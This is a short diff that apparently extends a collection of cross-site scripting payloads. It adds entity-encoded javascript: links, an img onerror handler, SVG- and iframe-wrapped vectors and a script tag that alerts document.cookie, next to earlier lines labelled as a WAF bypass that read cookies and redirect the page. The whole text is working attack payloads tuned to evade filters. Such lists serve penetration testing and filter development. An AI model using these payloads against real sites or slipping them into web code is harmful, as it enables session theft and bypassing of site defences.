@@ -6,3 +6,9 @@
 <a aa aaa aaaa aaaaa href=j&#97v&#97script&#x3A;&97lert(document.cookie)>ClickMe
 <a href="j&#97;vascript&#x3A;&#97;lert('Rivek Raj Tamang WAF Bypass' + document.domain + '\nCookie: ' + document.cookie);
 window&#46;location&#46;href='https://github.com/rivek619';">ClickMe</a>
+
+<img src=1 href=1 onerror=alert(1)>
+<a href="javas&#99;ript:alert(1)">Click Here</a>
+<svg><a href="javascript:alert(1)">Click</a></svg>
+<script>alert&#x28;document.cookie&#x29;</script>
+<iframe src="javas&#x63;ript:alert('XSS')"></iframe>
